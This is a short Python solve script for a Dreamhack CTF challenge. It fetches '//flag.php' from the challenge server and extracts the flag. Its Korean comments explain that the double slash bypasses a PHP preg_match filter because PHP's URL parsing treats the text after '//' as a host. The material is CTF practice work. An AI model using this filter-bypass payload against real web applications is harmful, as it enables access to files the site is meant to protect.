from bs4 import BeautifulSoup
import urllib.request

URL = "http://host3.dreamhack.games:11750"
URI = "//flag.php"

f = urllib.request.urlopen(URL + URI)

resp = f.read()

soup = BeautifulSoup(resp, "html.parser")
h3 = soup.select_one('div > p > h3')
flag = h3.contents[0].replace('\n', '').replace('flag is ', '')

print(flag)

# 풀이
# 방법 1. flag.php 부분을 URI Encode로 강제로 바꿔서 브라우저에서 호출
# 방법 2. PHP에서 URL을 구분할때 //는 Host, /는 Path로 구분한다는 것을 응용해서 preg_match 필터 우회
#       . PAYLOAD : //flag.php (flag.php를 Host로 인식하게끔 우회 가능)
# 번외. 동일한 방법을 request 모듈을 썼을때는 안됐는데 urllib로는 되었음. 이유 확인 필요.